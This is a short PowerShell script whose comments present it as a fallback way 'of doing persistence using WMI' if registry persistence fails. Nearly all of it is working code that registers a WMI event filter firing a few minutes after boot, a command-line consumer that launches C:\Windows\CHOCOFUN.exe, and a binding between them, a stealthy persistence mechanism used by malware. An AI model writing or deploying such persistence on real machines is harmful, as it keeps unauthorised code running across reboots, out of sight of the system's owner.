# A potentional way of doing persistence using WMI?
# (We could use this if reg doesn't work but idk)
$Filter = 'ITSOVERITSFUCKED'
$Consumer = "ITSFUCKEDITSOVER"
$ChocoEXE = "C:\Windows\CHOCOFUN.exe"
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$Filter;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$Consumer;ExecutablePath=$ChocoEXE;CommandLineTemplate=$ChocoEXE}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
